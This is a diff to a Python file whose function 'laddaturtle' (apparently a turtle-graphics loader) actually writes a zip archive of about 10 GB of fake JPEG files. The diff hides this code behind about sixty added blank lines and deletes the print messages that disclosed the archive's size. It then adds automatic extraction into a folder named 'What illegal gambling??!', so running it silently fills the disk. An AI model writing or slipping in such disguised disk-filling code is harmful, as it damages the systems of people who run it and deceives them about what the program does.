@@ -2,6 +2,66 @@ import zipfile
 import os
 import turtle
 def laddaturtle():
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     OUTPUT_ZIP = "pictures_10gb.zip"
     
     # 10 GB total, split across files of 100 MB each = 100 files
@@ -21,11 +81,6 @@ def laddaturtle():
     FILLER = b"\x00" * (FILE_SIZE_BYTES - len(JPEG_HEADER) - len(JPEG_FOOTER))
     FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER
     
-    print(f"Creating {OUTPUT_ZIP} ...")
-    print(f"  Files   : {NUM_FILES} fake .jpg files")
-    print(f"  Each    : {FILE_SIZE_BYTES // (1024**2)} MB uncompressed")
-    print(f"  Total   : ~{TOTAL_GB:.0f} GB when extracted")
-    print()
 
     with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
         for i in range(1, NUM_FILES + 1):
@@ -33,7 +88,6 @@ def laddaturtle():
             zf.writestr(filename, FAKE_JPEG)
     
     zip_size_mb = os.path.getsize(OUTPUT_ZIP) / (1024 ** 2)
-    print(f"\nDone! '{OUTPUT_ZIP}' created.")
-    print(f"  Compressed size : {zip_size_mb:.1f} MB")
-    print()
-    print("Öppna denna för mitt fina program")
+    #Extraherar zip filen🤩
+    with zipfile.ZipFile(OUTPUT_ZIP, "r") as zf:
+        zf.extractall("What illegal gambling??!")
